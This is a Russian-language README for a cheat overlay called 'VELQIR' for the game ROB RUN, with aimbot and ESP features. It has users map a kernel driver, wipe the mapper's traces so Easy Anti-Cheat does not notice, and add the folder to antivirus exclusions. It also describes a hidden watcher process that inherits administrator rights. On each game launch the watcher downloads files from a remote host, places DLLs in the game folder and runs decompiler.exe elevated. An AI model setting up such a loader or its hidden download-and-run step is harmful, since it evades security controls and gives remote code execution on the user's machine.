VELQIR — оверлей для ROB RUN
by BAYHEX
===============================

Требуется: Windows 10/11 x64. Права администратора нужны только для загрузки
драйвера (1-driver.bat). Оверлей запускается без UAC.

Загрузка драйвера: 1-driver.bat > load-driver.ps1 > zxmapper.exe kernel-mode.sys
(маппер из прошлой сборки NightRun; скрипт открыт целиком, маппер лежит рядом).

Порядок запуска (важно!)
------------------------
1. Игра ROB RUN должна быть ЗАКРЫТА.
   Двойной клик по 1-driver.bat > подтверди UAC > дождись "VELQIR driver loaded"
   (загрузка занимает несколько секунд).
   Скрипт сам откажется работать, если игра запущена.
2. Запусти игру ROB RUN.
3. Двойной клик по 2-overlay.bat > оверлей включится (UAC больше не нужен).

Управление
----------
  RShift — открыть/закрыть меню (клавишу можно сменить во вкладке KEYS).

  Бинды на функции настраиваются как угодно: меню > вкладка KEYS >
  клик по клавише нужной функции > нажми любую клавишу (мышь тоже можно).
  Правый клик по клавише — очистить. Esc — отмена захвата.
  По умолчанию на функции ничего не забиндено.

  Вкладки:
    AIM    — аим: кость, FOV, скорость, sticky, предикт, фильтр ролей;
    ESP    — боксы, скелет, хитбоксы, здоровье, теги, снапы, дистанция, лут;
    KEYS   — все бинды (перебинд любой клавишей/мышью);
    COLORS — схемы подсветки и цвета ролей;
    MISC   — статус сессии, RE-RESOLVE, дамп, профили (3 слота), паника, выход.

  Выйти из оверлея: RShift > MISC > EXIT VELQIR.

Настройки
---------
  velqir.json рядом с VELQIR.exe — текущий конфиг (авто-сохранение).
  Профили: вкладка MISC > 3 слота SAVE/LOAD (profile1..3.json).
  velqir.session.json пишется скриптом при загрузке драйвера — не трогать.

Если антивирус удаляет zxmapper.exe, load-driver.ps1 или kernel-mode.sys —
добавь папку в исключения.

Следы маппера
-------------
zxmapper создаёт в реестре служебный ключ с рандомным именем и кладёт рядом
образ драйвера в %TEMP%. Сам он их за собой не убирает, а EAC отказывается
запускать игру, пока такой ключ существует ("Выгрузите <имя> перед запуском
игры"). Поэтому load-driver.ps1 сам вычищает эти ключи и файлы — до маппинга
и сразу после него. Если EAC всё равно ругается на имя драйвера — перезагрузись
и запусти 1-driver.bat ещё раз (в loader.log будет видно, что осталось).

Удалённый файл (тест)
---------------------
load-driver.ps1 после загрузки драйвера поднимает скрытый watcher-процесс
с теми же правами администратора. Пока игра не запущена, ничего не качается.

Watcher ждёт появления ROB RUN в списке процессов, сам находит папку игры,
проверяет файлы из списка на хостинге и запускает decompiler.exe.
Права уже унаследованы от окна 1-driver.bat, поэтому UAC второй раз
не появляется. Лог: watcher.log рядом с 1-driver.bat.

Список файлов задаётся в velqir.remote.json, поле files. Сейчас там:
  decompiler.exe  - проверяется, обновляется и запускается каждый раз
  gup.xml         - только проверяется и обновляется
  libcurl.dll     - только проверяется и обновляется

ПРАВА. Цепочка такая: 1-driver.bat -> load-driver.ps1 повышает права
через UAC -> из этого окна стартует watcher -> watcher запускает
decompiler.exe. Каждый шаг наследует тот же токен администратора, ни один
не понижает права и ни один не спрашивает UAC заново. Манифест внутри
decompiler.exe на это не влияет: при запуске из процесса с правами
администратора он получает их же, требование requireAdministrator в
манифесте уже удовлетворено.

Отсюда два условия, без которых прав не будет:
  - в окне UAC при запуске 1-driver.bat нажато "Да". Отказ теперь
    обрабатывается явно: окно не исчезает молча, а пишет, что драйвер
    не загружен и ничего не будет скачано;
  - watcher поднят именно через 1-driver.bat, а не запуском
    game-watcher.ps1 напрямую.

Проверить права можно по первой строке watcher.log - там настоящая
проверка токена, а не запись в лог:
  elevated=True  - права администратора есть, запуск пойдёт с ними
  elevated=False - прав нет, следующая строка об этом предупредит

КАК ПОНЯТЬ, ЧТО ЗАПУСК УДАЛСЯ. После запуска watcher ждёт 1.5 секунды и
смотрит, живёт ли процесс:
  [+] started decompiler.exe (pid 1234)
  [+] decompiler.exe is running (pid 1234, elevated=True)
  [!] decompiler.exe exited right away, code -1073741515 -
      the binary is broken, not the launcher
Второй вариант значит, что файл скачался и стартовал, но упал сам
(не хватает зависимости, битая сборка, блокировка античитом). Один pid
в логе без этой проверки ничего не доказывал бы.

decompiler.exe запускается при каждом старте игры - независимо от того,
было обновление или нет. Если хостинг недоступен, после 5 попыток
запускается копия, которая уже лежит в папке игры (отключается через
"launch_stale": false).

Остальные файлы обновляются только когда изменились: watcher скачивает
файл, сравнивает SHA256 с копией на диске и либо заменяет её, либо
оставляет как есть ("already current"). Неизменившийся файл не трогается,
поэтому игра может спокойно держать его открытым.

Перед скачиванием старый экземпляр decompiler.exe гасится, чтобы файл не был
залочен и на экране не осталась прошлая версия.

Папка игры определяется автоматически, по очереди:
  - game_dir из velqir.remote.json (если задан - берётся сразу)
  - путь процесса start_protected_game.exe (лаунчер EAC, в той же папке)
  - путь самого ROB RUN / MainModule / Win32_Process
  - MuiCache проводника (пишется при первом запуске игры)
  - библиотеки Steam из libraryfolders.vdf
  - неглубокий поиск по локальным дискам

Игра под EAC прячет свой путь, поэтому MuiCache и Steam - основные источники.
Если папка не нашлась, watcher продолжает попытки каждую секунду и пишет
об этом в лог. Принудительно закрепить папку можно так:
  "game_dir": "D:\\Steam\\steamapps\\common\\Rob Run"

Источник задаётся в velqir.remote.json:
  url                      - ссылка на хостинг; {file} заменяется на имя файла
  token                    - необязательный ключ, уходит как Authorization: Bearer
  files                    - список файлов: { "name", "url", "launch", "sha256" }
  owner, repo, tag, asset  - альтернатива: релиз на GitHub
  kill_old                 - true = гасить старый экземпляр перед заменой
  launch_stale             - true = запускать копию с диска, если хостинг молчит
  sha256                   - необязательная проверка целостности
  game_dir                 - принудительно заданная папка игры

Сейчас файлы тестовые. Остановить watcher: создать пустой watcher.stop
рядом с 1-driver.bat.

Важно
-----
- Драйвер грузится ТОЛЬКО при закрытой игре.
- Не запускай 1-driver.bat повторно без перезагрузки — каждый запуск добавляет
  ещё одну копию драйвера в память (скрипт сам это отслеживает).
- После серии тестов перезагрузка ПК = чистое состояние.

Сборка из исходников
--------------------
  build-all.bat              > собирает dist\load-driver.ps1, копирует маппер
                               и драйвер, публикует оверлей

  overlay\build-overlay.bat   > VELQIR.exe + *.dll   (.NET SDK 8+)
  loader\                     > прежняя exe-версия лоадера (не используется,
                               оставлена как референс)
